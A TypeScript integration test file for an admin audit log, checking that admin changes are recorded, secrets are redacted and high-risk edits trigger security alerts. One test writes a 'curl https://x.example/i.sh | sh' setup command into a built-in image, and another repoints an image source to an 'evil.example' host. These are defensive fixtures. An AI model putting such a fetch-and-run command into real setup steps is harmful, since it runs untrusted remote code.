/**
 * Admin audit log and security alerts
 * (docs/specs/2026-11-03-admin-audit-log-design.md).
 *
 * Each audited admin mutation writes exactly one `admin_audit_events` row
 * with the right action and target, and no secret material. High-risk
 * changes emit the `security.admin_change` log line and POST to the
 * operator webhook. `GET /api/org/audit-log` is admin only and bounded.
 */
import { createServer, type IncomingMessage, type Server } from "node:http";
import type { AddressInfo } from "node:net";
import { afterEach, beforeEach, describe, expect, it, vi, type MockInstance } from "vitest";
import { and, eq, sql } from "drizzle-orm";
import { bootTestApi, type TestApi } from "../integration/_setup.js";
import { adminAuditEvents, imageSources, type AdminAuditEventRow } from "../schema/index.js";
import {
  flushSecurityAlerts,
  recordAdminAudit,
  sanitizeChanges,
  SECURITY_ALERT_EVENT,
  SECURITY_ALERT_WEBHOOK_ENV,
} from "../services/admin-audit.js";
import { bootstrapAdminInviteCode } from "../test-helpers/bootstrap-admin-code.js";
import type { CreateTeamResponse, ListAdminAuditResponse } from "../wire/types.js";

const ADMIN = { "Content-Type": "application/json" };
const MEMBER = { "Content-Type": "application/json", "x-valet-test-user-id": "test-member" };
const SECRET_KEY = "sk-live-AUDITSECRET-0123456789abcdef-9876";

let api: TestApi | undefined;
let warnSpy: MockInstance<typeof console.warn>;

beforeEach(() => {
  warnSpy = vi.spyOn(console, "warn");
});

afterEach(async () => {
  await flushSecurityAlerts();
  warnSpy.mockRestore();
  vi.unstubAllEnvs();
  await api?.cleanup();
  api = undefined;
});

async function rows(t: TestApi): Promise<AdminAuditEventRow[]> {
  return t.providers.db.select().from(adminAuditEvents).where(eq(adminAuditEvents.orgId, "local-org"));
}

/** The rows added by `fn`, in insert order. */
async function rowsFrom(t: TestApi, fn: () => Promise<unknown>): Promise<AdminAuditEventRow[]> {
  const before = new Set((await rows(t)).map((r) => r.id));
  await fn();
  return (await rows(t)).filter((r) => !before.has(r.id)).sort((a, b) => a.createdAt - b.createdAt);
}

/** The `security.admin_change` alert kinds logged so far. */
function alertKinds(): string[] {
  const kinds: string[] = [];
  for (const call of warnSpy.mock.calls) {
    const first: unknown = call[0];
    if (typeof first !== "string" || !first.startsWith("{")) continue;
    try {
      const parsed: unknown = JSON.parse(first);
      if (parsed && typeof parsed === "object" && "event" in parsed && parsed.event === SECURITY_ALERT_EVENT &&
        "kind" in parsed && typeof parsed.kind === "string") kinds.push(parsed.kind);
    } catch {
      // Not a structured line.
    }
  }
  return kinds;
}

async function send(t: TestApi, method: string, path: string, body?: unknown, headers: Record<string, string> = ADMIN): Promise<Response> {
  return fetch(`${t.baseUrl}${path}`, { method, headers, ...(body === undefined ? {} : { body: JSON.stringify(body) }) });
}

async function one(t: TestApi, method: string, path: string, body?: unknown): Promise<{ res: Response; row: AdminAuditEventRow }> {
  let res: Response | undefined;
  const added = await rowsFrom(t, async () => {
    res = await send(t, method, path, body);
  });
  expect(res?.ok, `${method} ${path} -> ${res?.status}`).toBe(true);
  expect(added).toHaveLength(1);
  return { res: res!, row: added[0]! };
}

describe("admin audit rows", () => {
  it("records each LLM provider change once, with no key material", async () => {
    api = await bootTestApi();

    const create = await one(api, "POST", "/api/org/llm-providers", { kind: "openai_compatible", name: "internal", baseUrl: "https://user:pw@llm.example.com:8443/v1?token=abc" });
    const provider = (await create.res.json()) as { id: string };
    expect(create.row).toMatchObject({ action: "llm_provider.create", targetType: "llm_provider", targetId: provider.id, targetName: "internal", actorUserId: "local-user", actorEmail: "local@dev" });
    expect(create.row.changes).toMatchObject({ kind: "openai_compatible", baseUrl: "https://llm.example.com:8443/v1" });
    expect(alertKinds()).toEqual(["llm_provider_created"]);

    const rename = await one(api, "PATCH", `/api/org/llm-providers/${provider.id}`, { name: "renamed" });
    expect(rename.row).toMatchObject({ action: "llm_provider.update", targetName: "renamed" });
    expect(rename.row.changes).toEqual({ name: { from: "internal", to: "renamed" } });
    expect(alertKinds()).toEqual(["llm_provider_created"]);

    const move = await one(api, "PATCH", `/api/org/llm-providers/${provider.id}`, { baseUrl: "https://llm2.example.com/v1" });
    expect(move.row.changes).toEqual({ baseUrl: { from: "https://llm.example.com:8443/v1", to: "https://llm2.example.com/v1" } });
    expect(alertKinds()).toEqual(["llm_provider_created", "llm_provider_base_url_changed"]);

    const keySet = await one(api, "PUT", `/api/org/llm-providers/${provider.id}/key`, { apiKey: SECRET_KEY });
    expect(keySet.row).toMatchObject({ action: "llm_provider.key_set", targetId: provider.id });
    expect(keySet.row.changes).toEqual({ keyLast4: "9876" });

    const keyClear = await one(api, "DELETE", `/api/org/llm-providers/${provider.id}/key`);
    expect(keyClear.row).toMatchObject({ action: "llm_provider.key_clear", changes: null });

    const del = await one(api, "DELETE", `/api/org/llm-providers/${provider.id}`);
    expect(del.row).toMatchObject({ action: "llm_provider.delete", targetId: provider.id });

    const all = JSON.stringify(await rows(api));
    expect(all).not.toContain(SECRET_KEY);
    expect(all).not.toContain("AUDITSECRET");
    expect(all).not.toContain("pw@");
    expect(all).not.toContain("token=abc");
    const logged = warnSpy.mock.calls.map((call) => String(call[0])).join("\n");
    expect(logged).not.toContain(SECRET_KEY);
  });

  it("records a refused mutation as nothing", async () => {
    api = await bootTestApi();
    const added = await rowsFrom(api, async () => {
      expect((await send(api!, "POST", "/api/org/llm-providers", { kind: "openai_compatible", name: "x", baseUrl: "http://a" }, MEMBER)).status).toBe(403);
      expect((await send(api!, "POST", "/api/org/llm-providers", { kind: "nope", name: "x" })).status).toBe(400);
    });
    expect(added).toEqual([]);
    expect(alertKinds()).toEqual([]);
  });

  it("records admin grants, invites, and org changes", async () => {
    api = await bootTestApi();

    const gate = await one(api, "PATCH", "/api/org", { features: { organizations: true } });
    expect(gate.row).toMatchObject({ action: "org.update", targetType: "org" });
    expect(gate.row.changes).toEqual({ "features.organizations": { from: false, to: true } });

    const grant = await one(api, "PATCH", "/api/org/members/test-member", { role: "admin" });
    expect(grant.row).toMatchObject({ action: "org_member.grant_admin", targetType: "org_member", targetId: "test-member", targetName: "member@dev" });
    expect(grant.row.changes).toEqual({ role: { from: "member", to: "admin" } });

    const revoke = await one(api, "PATCH", "/api/org/members/test-member", { role: "member" });
    expect(revoke.row.action).toBe("org_member.revoke_admin");

    const sso = await one(api, "PATCH", "/api/org", { features: { ssoTeamSync: true } });
    expect(sso.row).toMatchObject({ action: "auth_policy.update", targetType: "auth_policy" });

    const invite = await one(api, "POST", "/api/org/invites", { role: "admin", email: "new@dev" });
    const inviteBody = (await invite.res.json()) as { id: string; code: string };
    expect(invite.row).toMatchObject({ action: "invite.create", targetType: "invite", targetId: inviteBody.id, targetName: "new@dev" });
    expect(JSON.stringify(invite.row)).not.toContain(inviteBody.code);

    const inviteRevoke = await one(api, "DELETE", `/api/org/invites/${inviteBody.id}`);
    expect(inviteRevoke.row.action).toBe("invite.revoke");

    expect(alertKinds()).toEqual(["new_admin", "sign_in_policy_changed", "new_admin"]);
  });

  it("records image source changes, manual bakes, and built-in image edits", async () => {
    // Pins the audit rows for changes that apply at once. Second-admin
    // approval, where present, holds content changes back; it is off here.
    vi.stubEnv("VALET_IMAGE_SOURCE_APPROVAL", "off");
    api = await bootTestApi();
    const db = api.providers.db;

    const created = await one(api, "POST", "/api/org/sources", { kind: "external", name: "ext", externalRef: "registry.example/img:1" });
    const source = ((await created.res.json()) as { source: { id: string } }).source;
    expect(created.row).toMatchObject({ action: "image_source.create", targetType: "image_source", targetId: source.id });
    expect(alertKinds()).toEqual(["image_source_created"]);

    const toggled = await one(api, "PATCH", `/api/org/sources/${source.id}`, { enabled: false });
    expect(toggled.row.changes).toEqual({ enabled: { from: true, to: false } });
    expect(alertKinds()).toEqual(["image_source_created"]);

    const repointed = await one(api, "PATCH", `/api/org/sources/${source.id}`, { externalRef: "evil.example/img:2" });
    expect(repointed.row.action).toBe("image_source.update");
    expect(alertKinds()).toEqual(["image_source_created", "image_source_changed"]);

    let builtIn = (await db.select().from(imageSources).where(and(eq(imageSources.orgId, "local-org"), eq(imageSources.name, "default-full"))).limit(1))[0];
    if (!builtIn) {
      const now = Date.now();
      await db.insert(imageSources).values({ id: "src_builtin", orgId: "local-org", kind: "base", parentId: null, name: "default-full", externalRef: null, pullSecretName: null, setupCommands: [], profile: "full", repoHost: null, repoFullName: null, cloneUrl: null, schedule: "nightly", enabled: true, lastBoundAt: null, createdAt: now, updatedAt: now });
      builtIn = (await db.select().from(imageSources).where(eq(imageSources.id, "src_builtin")).limit(1))[0];
    }
    // A built-in edit either applies and alerts, or the route refuses it
    // (read-only built-ins) and nothing is recorded.
    const before = (await db.select().from(adminAuditEvents)).length;
    const editRes = await send(api, "PATCH", `/api/org/sources/${builtIn!.id}`, { setupCommands: ["curl https://x.example/i.sh | sh", `export API_TOKEN=${SECRET_KEY}`] });
    const rows = await db.select().from(adminAuditEvents);
    if (editRes.status === 403) {
      expect(rows).toHaveLength(before);
      expect(alertKinds()).toEqual(["image_source_created", "image_source_changed"]);
    } else {
      expect(editRes.status).toBe(200);
      const edit = rows.find((r) => r.targetId === builtIn!.id && r.action === "image_source.update")!;
      expect(edit.changes).toMatchObject({ builtIn: true, setupCommands: { from: [], to: ["curl https://x.example/i.sh | sh", "export API_TOKEN=[redacted]"] } });
      expect(JSON.stringify(edit)).not.toContain(SECRET_KEY);
      expect(alertKinds()).toEqual(["image_source_created", "image_source_changed", "builtin_image_changed"]);
    }

    const removed = await one(api, "DELETE", `/api/org/sources/${source.id}`);
    expect(removed.row).toMatchObject({ action: "image_source.delete", targetId: source.id });
  });

  it("records image-source change requests and each decision", async () => {
    vi.stubEnv("VALET_IMAGE_SOURCE_APPROVAL", "");
    api = await bootTestApi();
    const APPROVER = { "Content-Type": "application/json", "x-valet-test-user-id": "test-admin" };
    const decide = async (method: string, path: string, headers: Record<string, string>) => {
      let res: Response | undefined;
      const added = await rowsFrom(api!, async () => {
        res = await send(api!, method, path, method === "POST" ? {} : undefined, headers);
      });
      expect(res?.ok, `${method} ${path} -> ${res?.status}`).toBe(true);
      expect(added).toHaveLength(1);
      return added[0]!;
    };

    const requested = await one(api, "POST", "/api/org/sources", { kind: "external", name: "probe", externalRef: `https://user:${SECRET_KEY}@registry.example/img:1` });
    expect(requested.res.status).toBe(202);
    const changeId = ((await requested.res.json()) as { pendingChange: { id: string } }).pendingChange.id;
    expect(requested.row).toMatchObject({ action: "image_source.change_requested", targetName: "probe" });
    expect(requested.row.changes).toMatchObject({ changeId, change: "create", requestedBy: "local-user", externalRef: "https://registry.example/img:1" });
    expect(JSON.stringify(requested.row)).not.toContain(SECRET_KEY);
    expect(alertKinds()).toEqual(["image_source_created"]);

    const approved = await decide("POST", `/api/org/sources/changes/${changeId}/approve`, APPROVER);
    expect(approved).toMatchObject({ action: "image_source.create", actorUserId: "test-admin", targetName: "probe" });
    expect(approved.changes).toMatchObject({ changeId, requestedBy: "local-user", approvedBy: "test-admin" });
    expect(alertKinds()).toEqual(["image_source_created", "image_source_created"]);

    const second = await one(api, "POST", "/api/org/sources", { kind: "external", name: "probe-2", externalRef: "registry.example/img:2" });
    const secondId = ((await second.res.json()) as { pendingChange: { id: string } }).pendingChange.id;
    const rejected = await decide("POST", `/api/org/sources/changes/${secondId}/reject`, APPROVER);
    expect(rejected).toMatchObject({ action: "image_source.change_rejected", actorUserId: "test-admin" });

    const third = await one(api, "POST", "/api/org/sources", { kind: "external", name: "probe-3", externalRef: "registry.example/img:3" });
    const thirdId = ((await third.res.json()) as { pendingChange: { id: string } }).pendingChange.id;
    const withdrawn = await decide("DELETE", `/api/org/sources/changes/${thirdId}`, ADMIN);
    expect(withdrawn).toMatchObject({ action: "image_source.change_withdrawn", actorUserId: "local-user" });
  });

  it("records org settings, policies, model policy, and shared credentials", async () => {
    api = await bootTestApi();

    const settings = await one(api, "PATCH", "/api/org/settings", { allowPublicArtifacts: true });
    expect(settings.row).toMatchObject({ action: "org_settings.update", targetType: "org_settings" });
    expect(settings.row.changes).toEqual({ allowPublicArtifacts: { from: false, to: true } });

    const policy = await one(api, "POST", "/api/org/policies", { service: "github", mode: "deny" });
    const policyId = ((await policy.res.json()) as { id: string }).id;
    expect(policy.row).toMatchObject({ action: "org_policy.create", targetType: "org_policy", targetId: policyId, targetName: "github" });
    expect((await one(api, "PATCH", `/api/org/policies/${policyId}`, { mode: "require_approval" })).row.action).toBe("org_policy.update");
    expect((await one(api, "DELETE", `/api/org/policies/${policyId}`)).row.action).toBe("org_policy.revoke");

    const approved = await one(api, "PUT", "/api/org/approved-models", { approved: null });
    expect(approved.row).toMatchObject({ action: "model_policy.approved_models_update", targetType: "model_policy" });

    const cred = await one(api, "PUT", "/api/credentials/acme", { scope: "org", type: "api_key", apiKey: SECRET_KEY });
    expect(cred.row).toMatchObject({ action: "credential.set", targetType: "credential", targetId: "org:local-org:acme" });
    expect(cred.row.changes).toMatchObject({ scope: "org", type: "api_key" });
    const credDel = await one(api, "DELETE", "/api/credentials/acme?scope=org");
    expect(credDel.row.action).toBe("credential.delete");

    // A member's own credential is not an admin change.
    const personal = await rowsFrom(api, async () => {
      expect((await send(api!, "PUT", "/api/credentials/acme", { type: "api_key", apiKey: SECRET_KEY }, MEMBER)).ok).toBe(true);
    });
    expect(personal).toEqual([]);

    expect(JSON.stringify(await rows(api))).not.toContain(SECRET_KEY);
    expect(alertKinds()).toEqual([]);
  });

  it("records team policy changes and credential shares", async () => {
    api = await bootTestApi();
    const teamRes = await send(api, "POST", "/api/teams", { name: "audit-team" });
    expect(teamRes.ok).toBe(true);
    const teamId = ((await teamRes.json()) as CreateTeamResponse).team.id;
    expect(teamId).not.toBe("");

    const created = await one(api, "POST", `/api/teams/${teamId}/policies`, { service: "github", mode: "deny" });
    expect(created.row).toMatchObject({ action: "team_policy.create", targetType: "team_policy", targetName: "github" });
    expect(created.row.changes).toMatchObject({ teamId, mode: "deny" });
    expect((await one(api, "DELETE", `/api/teams/${teamId}/policies/${created.row.targetId}`)).row.action).toBe("team_policy.revoke");

    expect((await send(api, "PUT", "/api/credentials/acme", { type: "api_key", apiKey: SECRET_KEY })).ok).toBe(true);
    const share = await one(api, "POST", "/api/credentials/acme/delegate", { teamId });
    expect(share.row).toMatchObject({ action: "credential_share.create", targetType: "credential_share" });
    expect((await one(api, "DELETE", `/api/credentials/acme/delegations/${teamId}`)).row.action).toBe("credential_share.revoke");
    expect(JSON.stringify(await rows(api))).not.toContain(SECRET_KEY);
  });

  it("records a new user joining, with a new_admin alert for an admin sign-up", async () => {
    api = await bootTestApi({ auth: true });
    const res = await fetch(`${api.baseUrl}/api/auth/sign-up/email`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ name: "First", email: "first@nowhere.test", password: "correct-horse-battery", inviteCode: await bootstrapAdminInviteCode(api.providers.db) }),
    });
    expect(res.status).toBe(200);
    const joined = (await api.providers.db.select().from(adminAuditEvents)).filter((r) => r.action === "user.join");
    expect(joined).toHaveLength(1);
    expect(joined[0]).toMatchObject({ targetType: "user", targetName: "first@nowhere.test", actorEmail: "first@nowhere.test" });
    expect(joined[0]!.changes).toMatchObject({ role: "admin" });
    expect(JSON.stringify(joined)).not.toContain("correct-horse-battery");
    expect(alertKinds()).toEqual(["new_admin"]);
  });
});

describe("GET /api/org/audit-log", () => {
  it("refuses a non-admin with 403", async () => {
    api = await bootTestApi();
    expect((await send(api, "GET", "/api/org/audit-log", undefined, MEMBER)).status).toBe(403);
  });

  it("pages newest first, caps the limit at 200, and filters", async () => {
    api = await bootTestApi();
    const db = api.providers.db;
    for (let i = 0; i < 205; i++) {
      await recordAdminAudit(db, { orgId: "local-org", actor: { userId: i % 2 ? "local-user" : "test-admin", email: null }, action: "org_settings.update", targetType: i % 5 === 0 ? "plugin" : "org_settings", targetId: String(i) });
    }
    await recordAdminAudit(db, { orgId: "other-org", actor: { userId: "x", email: null }, action: "org.update", targetType: "org" });

    const capped = (await (await send(api, "GET", "/api/org/audit-log?limit=500")).json()) as ListAdminAuditResponse;
    expect(capped.events).toHaveLength(200);
    expect(capped.nextCursor).not.toBeNull();
    const rest = (await (await send(api, "GET", `/api/org/audit-log?limit=200&cursor=${capped.nextCursor}`)).json()) as ListAdminAuditResponse;
    expect(rest.events).toHaveLength(5);
    expect(rest.nextCursor).toBeNull();
    const ids = [...capped.events, ...rest.events].map((e) => e.id);
    expect(new Set(ids).size).toBe(205);
    const times = [...capped.events, ...rest.events].map((e) => e.createdAt);
    expect(times).toEqual([...times].sort((a, b) => b - a));

    const first = (await (await send(api, "GET", "/api/org/audit-log")).json()) as ListAdminAuditResponse;
    expect(first.events).toHaveLength(50);
    // Rows written in the same millisecond tie on createdAt and order by id, so compare pages, not insert order.
    expect(first.events.map((e) => e.id)).toEqual(capped.events.slice(0, 50).map((e) => e.id));

    const plugins = (await (await send(api, "GET", "/api/org/audit-log?targetType=plugin&limit=200")).json()) as ListAdminAuditResponse;
    expect(plugins.events).toHaveLength(41);
    const byActor = (await (await send(api, "GET", "/api/org/audit-log?actorUserId=test-admin&limit=200")).json()) as ListAdminAuditResponse;
    expect(byActor.events.every((e) => e.actorUserId === "test-admin")).toBe(true);
    expect(byActor.events).toHaveLength(103);

    expect((await send(api, "GET", "/api/org/audit-log?limit=0")).status).toBe(400);
    expect((await send(api, "GET", "/api/org/audit-log?cursor=not-a-cursor")).status).toBe(400);
    expect((await send(api, "GET", "/api/org/audit-log?targetType=bogus")).status).toBe(400);
  });
});

describe("security alert delivery", () => {
  let server: Server | undefined;
  afterEach(async () => {
    await new Promise<void>((resolve) => (server ? server.close(() => resolve()) : resolve()));
    server = undefined;
  });

  async function receiver(): Promise<{ url: string; bodies: unknown[] }> {
    const bodies: unknown[] = [];
    server = createServer((req: IncomingMessage, res) => {
      let text = "";
      req.on("data", (chunk: Buffer) => (text += chunk.toString("utf8")));
      req.on("end", () => {
        bodies.push(JSON.parse(text));
        res.writeHead(204).end();
      });
    });
    await new Promise<void>((resolve) => server!.listen(0, "127.0.0.1", resolve));
    const { port } = server.address() as AddressInfo; // listen(0) on a TCP host returns AddressInfo.
    return { url: `http://127.0.0.1:${port}/hook`, bodies };
  }

  it("posts the alert to the operator webhook, without secrets", async () => {
    const hook = await receiver();
    vi.stubEnv(SECURITY_ALERT_WEBHOOK_ENV, hook.url);
    api = await bootTestApi();
    const res = await send(api, "POST", "/api/org/llm-providers", { kind: "openai_compatible", name: "internal", baseUrl: "https://llm.example.com/v1?key=leak" });
    expect(res.status).toBe(201);
    await flushSecurityAlerts();
    expect(hook.bodies).toHaveLength(1);
    expect(hook.bodies[0]).toMatchObject({ event: SECURITY_ALERT_EVENT, kind: "llm_provider_created", action: "llm_provider.create", orgId: "local-org", actorEmail: "local@dev", targetName: "internal" });
    expect(JSON.stringify(hook.bodies)).not.toContain("leak");
  });

  it("sends no webhook for a low-risk change", async () => {
    const hook = await receiver();
    vi.stubEnv(SECURITY_ALERT_WEBHOOK_ENV, hook.url);
    api = await bootTestApi();
    expect((await send(api, "PATCH", "/api/org/settings", { allowPublicArtifacts: true })).ok).toBe(true);
    await flushSecurityAlerts();
    expect(hook.bodies).toEqual([]);
  });

  it("keeps the request and the alert when the audit write fails", async () => {
    api = await bootTestApi();
    const errorSpy = vi.spyOn(console, "error").mockImplementation(() => {});
    try {
      await api.providers.db.execute(sql`DROP TABLE admin_audit_events`);
      await expect(recordAdminAudit(api.providers.db, { orgId: "local-org", actor: { userId: "local-user", email: "local@dev" }, action: "llm_provider.create", targetType: "llm_provider", alert: "llm_provider_created" })).resolves.toBeUndefined();
      expect(errorSpy.mock.calls.map((c) => String(c[0])).join("\n")).toContain("admin_audit_write");
      expect(alertKinds()).toEqual(["llm_provider_created"]);
    } finally {
      errorSpy.mockRestore();
    }
  });
});

describe("sanitizeChanges", () => {
  it("drops secret-named keys and masks secret assignments, URL credentials, and bearer tokens", () => {
    expect(sanitizeChanges({
      apiKey: "x",
      accessToken: "y",
      nested: { password: "z", ok: 1 },
      cmd: "TOKEN=abc123 run && GITHUB_PAT='p q' go",
      header: "Authorization: Bearer abcdefghijklmnop",
      url: "https://u:p@h.example/p?q=1",
    })).toEqual({
      nested: { ok: 1 },
      cmd: "TOKEN=[redacted] run && GITHUB_PAT=[redacted] go",
      header: "Authorization: Bearer [redacted]",
      url: "https://h.example/p",
    });
    expect(sanitizeChanges({})).toBeNull();
  });
});
